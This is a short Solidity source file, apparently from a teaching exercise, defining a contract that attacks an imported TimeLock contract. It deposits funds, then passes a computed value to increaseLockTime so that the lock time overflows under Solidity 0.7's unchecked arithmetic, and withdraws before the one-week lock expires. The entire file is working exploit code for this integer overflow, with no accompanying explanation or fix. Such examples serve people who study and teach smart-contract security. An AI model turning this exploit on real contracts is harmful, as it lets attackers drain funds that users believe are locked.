pragma solidity ^0.7.6;

import "./vulnerable_contract.sol";

contract MaliciousContract {
    TimeLock public timeLock;

    constructor(TimeLock _timeLock) {
        timeLock = _timeLock;
    }

    function attack() public payable {
        // Step 1: Deposit funds to become a participant
        timeLock.deposit{value: msg.value}();

        // Step 2: Overflow the lockTime
        uint256 maxUint = type(uint256).max;
        uint256 timeToOverflow = maxUint - timeLock.lockTime(address(this)) + 1;
        timeLock.increaseLockTime(timeToOverflow);

        // Step 3: Attempt withdrawal before 1-week due to overflow
        timeLock.withdraw();
    }

    receive() external payable {} 
}